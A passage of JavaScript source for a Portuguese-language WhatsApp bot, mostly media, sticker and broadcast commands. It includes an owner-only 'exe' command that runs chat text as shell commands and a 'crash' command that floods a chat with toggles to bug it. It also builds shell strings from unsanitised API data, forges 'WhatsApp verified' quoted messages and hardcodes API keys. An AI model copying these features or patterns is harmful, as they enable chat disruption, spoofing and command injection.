tujuh = fs.readFileSync('./assets/beat1.mp3');
tomioka.sendMessage(from, tujuh, MessageType.audio, {quoted: msg, mimetype: 'audio/mp4', ptt:true})
break
case 'tomioka':
if (!isGroup) return enviar(` SOMENTE EM GRUPOS`)
result = fs.readFileSync(`./figurinhas/tomioka.webp`)
tomioka.sendMessage(from, result, sticker, {contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'status':

case 'stats':
groups = tomioka.chats.array.filter(v => v.jid.endsWith('g.us'))
privat = tomioka.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
uptime = process.uptime();
unread = await tomioka.loadAllUnreadMessages();
timestampe = speed();
totallChat = await tomioka.chats.all()
latensie = speed() - timestampe
teks = `\`\`\`ESTAT√çSTICAS DE BOT\`\`\`
\`\`\`‚ñ¢ mensagens nao lidas: ${unread.length}\`\`\`
\`\`\`‚ñ¢ Bate-papos em grupo : ${groups.length}\`\`\`
\`\`\`‚ñ¢ Chats Privados : ${privat.length}\`\`\`
\`\`\`‚ñ¢ Total de bate-papos : ${totallChat.length}\`\`\`
\`\`\`‚ñ¢ Velocidade : ${latensie.toFixed(4)} _Segundo_\`\`\`
\`\`\`‚ñ¢ Tempo Ativo : ${kyun(uptime)}\`\`\`


\`\`\`ESTAT√çSTICAS DE TELEFONE\`\`\`
\`\`\`‚ñ¢ Uso de Ram : ${ram2}\`\`\`
\`\`\`‚ñ¢ Plataforma : ${os.platform()}\`\`\`
\`\`\`‚ñ¢ Hostname : ${os.hostname()}\`\`\`
\`\`\`‚ñ¢ Tempo de atividade : ${runtime(process.uptime())}\`\`\`
\`\`\`‚ñ¢ Wa Vers√£o: ${tomioka.user.phone.wa_version}\`\`\`
\`\`\`‚ñ¢ A vers√£o: ${tomioka.user.phone.os_version}\`\`\`
\`\`\`‚ñ¢ Fabricante do dispositivo: ${tomioka.user.phone.device_manufacturer}\`\`\`
\`\`\`‚ñ¢ Modelo do dispositivo: ${tomioka.user.phone.device_model}\`\`\`
\`\`\`‚ñ¢ N√∫mero da constru√ß√£o do sistema operacional: ${tomioka.user.phone.os_build_number}\`\`\``
enviar(teks)

break
case 'hinata':

return enviar ('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
anu = await fetchJson(`https://imgur.com/gallery/0nxV5Sc`, {method: 'get'})
hina = JSON.parse(JSON.stringify(anu));
ta =  hina[Math.floor(Math.random() * hina.length)];
nye = await getBuffer(ta)
tomioka.sendMessage(from, nye, image, { caption: 'hinata!!', contextInfo: null, quoted: tomio, contextInfo: tome})

break 
case 'hobby':

hobby = body.slice(1)
const hob =['Desah Di Game','Ngocokin Doi','Stalking sosmed nya mantan','Kau kan gak punya hobby awokawok','Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
const by = hob[Math.floor(Math.random() * hob.length)]
tomioka.sendMessage(from, 'Quest√£o : *'+hobby+'*\n\nResponda : '+ by, text, { contextInfo: null, quoted: tomio, contextInfo: tome})

break
case 'covid19':
post = await fetchJson(`https://api-gdr2.herokuapp.com/api/covidbr`)
send = `ùôáùôäùòæùòºùôá: ${post.result.local}\nùòøùòºùòøùôäùôé : ${post.result.dadosAtualizados}\nùôèùôäùôèùòºùôá ùòøùôÄ ùòæùòºùôéùôäùôé: ${post.result.totalCasos}\nùôâùôäùôëùôäùôé ùòæùòºùôéùôäùôé: ${post.result.novosCasos}\nùôèùôäùôèùòºùôá ùòøùôÄ ùôàùôäùôçùôèùôÄùôé: ${post.result.totalMortes}\nùôâùôäùôëùòºùôé ùôàùôäùôçùôèùôÄùôé: ${post.result.novasMortes}\nùôçùôÄùòæùôêùôãùôÄùôçùòºùòøùôäùôé: ${post.result.recuperados}\nùôëùòºùòæùôÑùôâùòºùòøùôäùôé-1: ${post.result.vacinadosPrimeiraDose}\nùôëùòºùòæùôÑùôâùòºùòøùôäùôé-2: ${post.result.vacinadosSegundaDose}\nùòΩùôäùôáùôÄùôèùôÑùôâùôé: ${post.result.boletinsContabilizados}`
tomioka.sendMessage(from, send, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": "ùêïùêûùê´ùê¢ùêüùê¢ùêúùêöùêùùê® ùê©ùê®ùê´ ùêñùê°ùêöùê≠ùê¨ùêöùê©ùê©\nEstatisticas Covid-19 Br", "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": fs.readFileSync('./assets/botlogo.webp')} } }, caption: "<//>" })
break
case 'nangis':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/cry?apikey=${TobzKey}`, {method: 'get'})
enviar('PACIENTE NGAB')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'exe':
tomioka.updatePresence(from, Presence.composing) 
if (!isOwner) return enviar(mess.only.ownerB)
const cmd = body.slice(5)
exec(cmd, (err, stdout) => {
if(err) return tomioka.sendMessage(from, "Comando errado", text, { quoted: tomio, contextInfo: tome })
if (stdout) {
tomioka.sendMessage(from, stdout, text, { quoted: tomio, contextInfo: tome })
}
})
break
case 'cium':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/kiss?apikey=${TobzKey}`, {method: 'get'})
enviar('Mwahhh')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'peluk':

ranp = getRandom('.gif')
rano = getRandom('.webp')
anu = await fetchJson(`https://tobz-api.herokuapp.com/api/hug?apikey=${TobzKey}`, {method: 'get'})
enviar('Peyukkkk')
if (anu.error) return enviar (anu.error)
exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(ranp)
if (err) return enviar (ind.stikga())
buffer = fs.readFileSync(rano)
tomioka.sendMessage(from, buffer, sticker, {quoted: msg})
fs.unlinkSync(rano)
})

break
case 'traduzir1':
teks = args.join(" ")
post = await fetchJson(`https://dapuhy-api.herokuapp.com/api/others/translate?from=id&to=pt&text=${teks}&apikey=SOTyzhkStLBrlpT`).then(async (x) => {
send = `${x.result}`
enviar(send)
})
break
case 'igdl':

case 'instagram':

try {

if (!q) return enviar('cade o link?')

enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')

res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=Skillerofc&url=${args[0]}`)

for(let i = 0; i < res.data.result.length; i++) {

sendMediaURL(from, res.data.result[i].url, `‚îè‚îâ‚å£ ‚îàÃ•-Ã∂ÃØÕ°..Ã∑Ã¥‚úΩÃ∂‚îÑ‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îâ‚îì

‚îÜ *INSTAGRAM MEDIA*

‚îî‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚îà‚å£ ‚îàÃ•-Ã∂ÃØÕ°..Ã∑Ã¥‚úΩÃ∂‚å£ ‚úΩÃ∂



*Dados obtidos com sucesso!*

\`\`\`‚ñ¢ Nome do usu√°rio : ${res.data.owner}\`\`\`

\`\`\`‚ñ¢ Rubrica : ${res.data.caption}\`\`\``, {thumbnail: Buffer.alloc(0)})

}

} catch (e) {

console.log(e)

enviar(String(e))

}

break
case 'crash': //@tio_tomioka_ofc
if (!isOwner) return enviar('dono')
if (args.length < 1) return enviar('qual o tamanho?')
for (let i = 0; i < args[0]; i++) {
await tomioka.toggleDisappearingMessages(from, 0)
}
tomioka.sendMessage(from, 'TOMIOKA BUGüëª '+args.join(' '), fake)
break
case 'pastebin':

if(!q) return enviar(`Example : …™ ·¥Ä·¥ç ·¥¢·¥Ä·¥ã ô·¥è·¥õ·¥¢`)

anu = await fetchJson(`https://api-anoncybfakeplayer.herokuapp.com/pastebin?text=${q}`, {method: 'get'})

tomioka.sendMessage(from, `${anu.result}`, text, {quoted: tomio, contextInfo: tome})

break
case 'divulgar':
if (!isOwner) return enviar ('Quem √© voc√™?')
if (args.length < 1) return enviar ('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ ùêïùê¢ùêùùêûùê® ùêßùê®ùêØùê® ùêùùê® ùê≠ùê®ùê¶ùê¢ùê®ùê§ùêö ]\n\n${body.slice(4)}`})
}
enviar('Transmissao enviada')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ ùêïùê¢ùêùùêûùê® ùêßùê®ùêØùê® ùêùùê® ùê≠ùê®ùê¶ùê¢ùê®ùê§ùêö ]\n\n${body.slice(11)}`)
}
enviar('Tm enviada com sucesso')
}
break
case 'bc':
if (!isOwner) return enviar('Quem √© Voc√™, voc√™ n√£o √© meu dono üòÇ?')
if (args.length < 1) return enviar('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedImage) {
const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
buff = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, buff, image, {caption: `[ TRANSMI√á√ÉO DE AVISO ]\n\n${body.slice(4)}`})
}
enviar('Transmiss√£o enviada com sucesso')
} else {
for (let _ of anu) {
sendMess(_.jid, `[ TRANSMISS√ÉO DE AVISO ]\n\n${body.slice(4)}`)
}
enviar('Transmiss√£o enviada com sucesso')
}
break
case 'bcsticker':
case 'bcstik':
if (!isOwner) return enviar (mess.only.ownerB)
anu = await tomioka.chats.all()
if (isMedia && !msg.message.videoMessage || isQuotedSticker) {
const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
bc = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, bc, sticker, {quoted:msg})
}
enviar('tm de fig enviada')
}
break
case 'bcaudio':
if (!isOwner) return enviar('```OWNER ONLY```')
if (args.length < 1) return enviar('.......')
anu = await tomioka.chats.all()
if (isMedia && !msg.message.audioMessage || isQuotedAudio) {
const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
bc = await tomioka.downloadMediaMessage(encmedia)
for (let _ of anu) {
tomioka.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: tomio, contextInfo: tome,caption: `[ *TOMIOKA TRANSMISS√ÉO* ]\n\n${body.slice(9)}`})
}
enviar('sucesso')
}
break
////transmiss√£o
case 'banchat':
case 'pausar':
if (!isOwner) return 
if (args.length < 1) return enviar('Para activar usa *si* y para desactivar *no*')
if ((args[0]) === 'si') {
if (isBanChat) return enviar('Ya el bot esta ignorando este chat!')
chatban.push(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
enviar('*Bot pausado en este grupo.*')
} else if ((args[0]) === 'no') {
chatban.splice(from)
fs.writeFileSync('./src/ban.json', JSON.stringify(chatban))
enviar('*El Bot ya no esta pausado en este grupo.*')
} else {
enviar(`Porfavor escriba bien el comando: ${prefix}banchat *si/no*`)
}
break
//MODULOS
case 'google':
case 'googleimage':
case 'img':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('O que voc√™ deseja procurar?')
console.log(color('[premium]', 'cyan'), color('[‚ùó] PROCURANDO A IMAGEM NO GOOGLE...', 'magenta'))
enviar('espere')
teks = args.join(' ')
res = await googleImage(teks, google)
function google(error, result){
if (error){ return enviar('_[ ! ] Erro encontrado ou resultado n√£o encontrado_')}
else {
gugIm = result
random =  gugIm[Math.floor(Math.random() * gugIm.length)].url
sendFileFromUrl(random, image, {quoted: tomio, caption: `*Resultados da pesquisa de : * ${teks}`})
}
}
break
/*
case 'mediafire':
if (args.length < 1) return enviar('Digite o link do arquivo que deseja buscar no Mediafire')
if(!isUrl(args[0]) && !args[0].includes('mediafire'), {DetectLinks: true} ) return 


enviar('*„Äå ‚ùó „Äç Aguarde um pouco, baixando seu jogo/app...*')
teks = args.join(' ')
const resem = await mediafireDl(teks)
result = `*„Äå  MEDIAFIRE DOWNLOAD  „Äç*

*Nome :* ${resem[0].nama}
*Tamanho :* ${resem[0].size}
*Link :* ${resem[0].link}`
enviar(result)
sendFileFromUrl(resm[0].link, document, {mimetype: resm[0].mime, filename: resm[0].nama, quoted: msg})
break
*/
case 'mediafire':
if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 0) return enviar('e o link?')
if (budy.includes("https:"))
//if(!isUrl(args[0]) && isMedia && !args[0].includes('mediafire'), {detectlinks: true}) return //enviar('Link invalido, el link debe ser de MediaFire')
enviar('üï∞Ô∏è *·¥ás·¥ò·¥á Ä·¥á, ·¥á·¥ç ·¥ò Ä·¥è·¥Ñ·¥áss·¥è..*')
let ment = args.join(' ')
const resm = await zenmediafire(ment)
result = `  *ü™Ä „Äå  Mediafire Download  „Äç ü™Ä*

ü™Ä *Nome:* ${resm[0].nombre}

ü™Ä *Tamanho:* ${resm[0].size}

ü™Ä *Link:* ${resm[0].link}

_*O arquivo est√° sendo enviado, se voc√™ n√£o conseguir abrir o arquivo do pr√≥prio WhatsApp, basta acessar a pasta WhatsApp e os documentos e l√° voc√™ ver√° o arquivo baixado ...*_`
tomioka.sendMessage(from, img, MessageType.image, {quoted: msg, caption: result, contextInfo: null})
sendFileFromUrl(resm[0].link, MessageType.document, {mimetype: resm[0].mime, filename: resm[0].nombre, quoted: msg, contextInfo: null})
break
case 'videourl':
case 'tolink':  
if (!isPremium) return enviar ('s√≥ premium')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
if ((isMedia && !msg.message.videoMessage || isQuotedImage || isQuotedVideo ) && args.length == 0) {
boij = isQuotedImage || isQuotedVideo ? JSON.parse(JSON.stringify(msg).replace('quotedM','m')).message.extendedTextMessage.contextInfo : msg
owgi = await tomioka.downloadMediaMessage(boij)
res = await upload(owgi)
enviar(res)
} else {
enviar('Marque um v√≠deo')
}
break
case 'igstory': 
if(!q) return enviar('cade o usuario?')
hx.igstory(q)
.then(async result => {
for(let i of result.medias){
if(i.url.includes('mp4')){
let link = await getBuffer(i.url)
tomioka.sendMessage(from,link,video,{quoted: msg,caption: `Type : ${i.type}`})
} else {
let link = await getBuffer(i.url)
tomioka.sendMessage(from,link,image,{quoted: msg,caption: `Type : ${i.type}`, thumbnail:null})               
}
}
});
case 'igstalk':
if (!q) return enviar('cade o usu√°rio?')
ig.fetchUser(`${args.join(' ')}`).then(Y => {
console.log(`${args.join(' ')}`)
ten = `${Y.profile_pic_url_hd}`
teks = `*ID* : ${Y.profile_id}\n*Nome do usu√°rio* : ${args.join('')}\n*Nome completo* : ${Y.full_name}\n*Bio* : ${Y.biography}\n*Seguidores* : ${Y.following}\n*Seguindo* : ${Y.followers}\n*Privado* : ${Y.is_private}\n*Verificado* : ${Y.is_verified}\n\n*Link* : https://instagram.com/${args.join('')}`
sendMediaURL(from,ten,teks) 
})      
break
case 'playy':

case 'lagu':
        if (!isPremium) return enviar ('s√≥ premium')
if (args.length < 1) return enviar('O que voc√™ deseja procurar?')

teks = args.join(' ')

enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')

if (!teks.endsWith("-doc")){

res = await yts(`${teks}`).catch(e => {

enviar('_ [!] O erro de consulta inserido n√£o existe_')

})

enviar(`....mandando sua musica:  *_${res.all[0].title}_*`)
let thumbInfo = `* TOMIOKABOT*
* T√≠tulo: * ${res.all[0].title}
*ID do v√≠deo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualiza√ß√µes: * ${res.all[0].views}
* Dura√ß√£o: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

//sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_[!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, audio, {quoted: msg, mimetype: 'audio/mp4', filename: 'tomioka'})

}

if (teks.endsWith("-doc")){

const tec = teks.split("-doc")

res = await yts(`${tec}`).catch(e => {

enviar ('_ [!] Erro de consulta que voc√™ inseriu em falta_')
})
enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* T√≠tulo: * ${res.all[0].title} 
*ID do v√≠deo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualiza√ß√µes: * ${res.all[0].views}
* Dura√ß√£o: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_ [!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, document, {quoted: msg, mimetype: 'audio/mp3', filename: 'tomioka'})

}

break
case 'pl000':   

if (args.length < 1) return enviar('*Digite o t√≠tulo?*')

enviar('carregando....')

play = args.join(" ")

anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=viniciusbot`)

if (anu.error) return enviar(anu.error)

infomp3 = `*„Äå PLAY VIDEO „Äç*



T√≠tulo : ${anu.result.title}

Fonte : ${anu.result.source}



* [Espere] Espere um minuto .. *`

///////buffer = await getBuffer(anu.result.thumbnail)

buffer1 = await getBuffer(anu.result.url_video)

tomioka.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted:tomioka, caption: 'Est√° ai'})

break  
case 'bugrow':
case 'tocarmc':    
enviar('*„Äå ‚ùó „Äç Aguarde um pouco, a procura da sua m√∫sica...*')
aramas = await yts(q);
aramat = aramas.all 
var mulaikah = aramat[0].url							
console.log(color('[YT PLAY M√öSICA]', 'magenta'), color(`PROCURANDO A M√öSICA NO YT`, 'yellow')) 
try {
yta(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `
„Äå  PLAY MUSIC  „Äç
T√≠tulo : ${title}
Tamanho : ${filesizeF}
Tipo : mp3
Link para download* : ${a.data}`)
const captions = `
„Äå  PLAY MUSIC  „Äç
T√≠tulo : ${title}
Tamanho : ${filesizeF}
Tipo : mp3
Link para download : ${a.data}`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar(err)
}
break
case 'play8':
if (!isPremium) return enviar ('s√≥ premium')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
play1 = body.slice(5)
anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp3?apikey=viniciusbot&q=${play1}`)
if (anu.error) return enviar(anu.error)
infomp3 = `*MUSICA ENCONTRADA!!!*\nT√≠tulo : ${anu.result.title}\nurl : ${anu.result.source}\nlink para download: ${anu.result.url_audio}\nTamanho : ${anu.result.size}`
buffer = await getBuffer(anu.result.thumbnail)
lagu = await getBuffer(anu.result.url_audio)
tomioka.sendMessage(from, buffer, image, {quoted: msg, caption: infomp3})
tomioka.sendMessage(from, lagu, audio, {mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${anu.result.title}.mp3`, 'jpegThumbnail': await getBuffer(anu.result.thumb)}}}})
break
case 'tiktok':
if (!q) return enviar('link?')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
res = await TiktokDownloader(`${q}`).catch(e => {
enviar('erro')
})
sendMediaURL(from, `${res.result.nowatermark}`, {quoted: tomio, contextInfo: tome}) 
break
///////////===============CASE BOTAO BUSCA YT/MUSICA E AUDIO DOWNLOADER========////// m√≥dulos 
case 'facebook':
case 'facemp4':  
case 'fb':
if (!q) return enviar(mess.wrongFormat)
if(!isUrl(args[0]) && !args[0].includes('facebook')) return enviar(mess.error.Iv)
teks = args[0]
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
res = await fbDown(teks).catch(e => {
enviar(`${e}`)
})
a = res[0]
result = `„Äå Facebook Downloader „Äç

‚Ä¢ T√≠tulo: ${a.judul}
‚Ä¢ Fonte : ${a.source}
‚Ä¢ Tamanho : ${a.size}
‚Ä¢ Qualidade : ${a.quality}
‚Ä¢ Modelo : ${a.type}
‚Ä¢ Nome do arquivo : ${a.judul}.${a.type}`
sendFileFromUrl(a.thumb, image, {caption: result, quoted: tomio, contextInfo: tome})
sendFileFromUrl(a.link, video, {mimetype: 'video/mp4',quoted: tomio, contextInfo: tome})
await limitAdd(sender)
break
case 'buscar':

if (!isPremium) return enviar ('s√≥ premium')

if (!q) return enviar('cade o nome?')

res = await yts(q)

let thumbInfo = ` 

*Youtube Download*

*T√≠tulo :* ${res.all[0].title}

*V√≠deo ID :* ${res.all[0].videoId}

*Carregado em:* ${res.all[0].ago}

*Visualiza√ß√µes :* ${res.all[0].views}

*Dura√ß√£o :* ${res.all[0].timestamp}

*Canal :* ${res.all[0].author.name}

*Canal de link:* ${res.all[0].author.url}



*Selecione a m√≠dia a ser baixada*

`

buttons = [{buttonId:`${prefix}pl000 ${q}`,buttonText:{displayText:'üé•VIDEO'},type:1},{buttonId:`${prefix}playy ${q}`,buttonText:{displayText:'üéµAUDIO'},type:1}]



imageMessage = (await tomioka.prepareMessageMedia({url:res.all[0].image},'imageMessage',{thumbnail:Buffer.alloc(0)})).imageMessage



buttonsMessage = {contentText: thumbInfo,footerText:'*_Selecione o tipo de arquivo abaixo_*',imageMessage,buttons,headerType:4}



prep = await tomioka.prepareMessageFromContent(from,{buttonsMessage},{})



tomioka.relayWAMessage(prep)

break
///////////===============CASE BOTAO BUSCA YT/MUSICA E AUDIO DOWNLOADER========//////
//abrir fechar grupo botao
case 'abfe':
gambar = fs.readFileSync('./me.jpg')
mhan = await tomioka.prepareMessage(from, gambar, MessageType.image, {quoted: msg, thumbnail: fs.readFileSync('./assets/botlogo.webp'), contextInfo: {"mentionedJid": [sender]}})
gbutsan = [
{buttonId: 'Abrir üîì', buttonText: {displayText: 'Abrir üîì'}, type: 1},
{buttonId: 'Fechar üîê', buttonText: {displayText: 'Fechar üîê'}, type: 1}]
gbuttonan = {
imageMessage: mhan.message.imageMessage,
contentText: `Ol√° @${sender.split("@")[0]} üòé`,
footerText: `¬©TioTomioka_`,
buttons: gbutsan,
headerType: 4
}
await tomioka.sendMessage(from, gbuttonan, MessageType.buttonsMessage)
break
//yt play lista
case 'ytplay':
if(!isGroup)return enviar('s√≥ grupo')
if(!q) return enviar('cade o nome ou o link?')
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
datai = [];
try{
ysearch = await yts(q)
hdata = ysearch.all
}catch(e){
return enviar('erro')
}
num = 1
for(let i=0; i<hdata.length; i++){
datai.push({
"rows": [
{
rowId: `${prefix}MP3 `+ hdata[i].title,
title: `${prefix}MP3`,
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
},
{
rowId: `${prefix}MP4 `+ hdata[i].title,
title: `${prefix}MP4`,
description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
}
], title: num})
num += 1
}
po = tomioka.prepareMessageFromContent(from, {
"listMessage":{
"title": "*YOUTUBE DOWNLOAD*",
"description": `Solicitado por: ${pushname}\n *Resultado da pesquisa: ${q}*\n*Baixe clicando no bot√£o abaixo* `,
"buttonText": "Result",
"listType": "SINGLE_SELECT",
"sections": datai}}, {}) 
tomioka.relayWAMessage(po, {waitForAck: true, quoted: tomio, contextInfo: tome})
break
case 'MP4':
if (args.length === 0) return enviar(`Use assim : *${prefix + command}* _O t√≠tulo da m√∫sica_`)  
enviar('·¥ò·¥è Ä “ì·¥Ä·¥†·¥è Ä, ·¥ás·¥ò·¥á Ä·¥á..')
aramas = await yts(q);
aramat = aramas.all 
mulaikah = aramat[0].url      
console.log(color('[YT PLAY V√çDEO]', 'magenta'), color(`PROCURANDO O V√çDEO NO YT`, 'yellow'))       
try {
ytv(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*„Äå REPRODUZIR V√çDEOS „Äç*\n\n*Titulo* : ${title}\n*Extra√ß√£o* : MP3\n*Tamanho do arquivo* : ${filesizeF}\n*Link* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
const captions = `*„Äå REPRODUZIR V√çDEOS „Äç*\n\n*Titulo* : ${title}\n*Extra√ß√£o* : MP4\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar('erro')
}
break
case 'MP3':                   
if (args.length === 0) return enviar(`Use assim *${prefix + command}* _O t√≠tulo da m√∫sica a ser pesquisada_`)
aramas = await yts(q);
aramat = aramas.all 
var mulaikah = aramat[0].url							
console.log(color('[YT PLAY M√öSICA]', 'magenta'), color(`PROCURANDO A M√öSICA NO YT`, 'yellow')) 
try {
yta(mulaikah)
.then((res) => {
const { dl_link, thumb, title, filesizeF, filesize } = res
axios.get(`https://tinyurl.com/api-createSticker.php?url=${dl_link}`)
.then(async (a) => {
if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*„Äå TOCAR M√öSICA „Äç*\n\n*Titulo* : ${title}\n*Extra√ß√£o* : mp3\n*Tamanho do arquivo* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`)
const captions = `*„Äå TOCAR M√öSICA „Äç*\n\n*Titulo* : ${title}\n*Extra√ß√£o* : mp3\n*Tamanho* : ${filesizeF}\n*Link para dowload* : ${a.data}\n\n_Aguarde o envio do arquivo; isso pode levar alguns minutos_`
sendMediaURL(from, thumb, captions)
await sendMediaURL(from, dl_link).catch(() => enviar('error'))
})                
})
} catch (err) {
enviar(err)
}
break

case 'addfoto':
if (!isGroup) return enviar ('s√≥ grupo')
if (!isOwner) return enviar ('Voc√™ quem √© o dono? ')
tomioka.sendMessage(from, addfoto(prefix), text, { contextInfo: null, quoted: tomio, contextInfo: tome})
break
case 'next':
if (!isUser) return enviar (`„Äå ‚ùó „ÄçRegistre-se primeiro\nMande o comando : ${prefix}rg`)
if (isGroup) return  enviar( 'N√ÉO PODE ESTAR EM GRUPO!!!!')
await enviar('Ache um companheiro >_<')
await enviar(`wa.me/${anug}`)
await enviar( `Par encontrado: üêä\n*${prefix}next* ‚Äî Encontre novos parceiros`)
break		    
case 'tedio':	
